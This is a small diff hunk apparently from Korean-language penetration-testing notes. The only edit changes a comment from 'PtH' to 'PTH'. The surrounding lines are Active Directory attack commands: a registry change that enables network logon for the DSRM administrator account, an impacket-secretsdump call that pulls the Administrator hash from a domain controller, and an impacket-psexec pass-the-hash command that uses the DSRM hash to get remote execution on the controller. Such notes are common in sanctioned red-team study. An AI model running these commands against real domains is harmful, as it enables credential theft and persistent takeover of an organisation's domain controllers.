@@ -166,7 +166,7 @@ ntdsutil
 reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
 # 값 2 = 네트워크 로그온 허용
 
-# DSRM hash로 PtH
+# DSRM hash로 PTH
 impacket-secretsdump -just-dc-user "Administrator" TARGET/Administrator@DC_IP
 # SAM의 로컬 Administrator hash 사용
 impacket-psexec -hashes :DSRM_HASH administrator@DC_IP
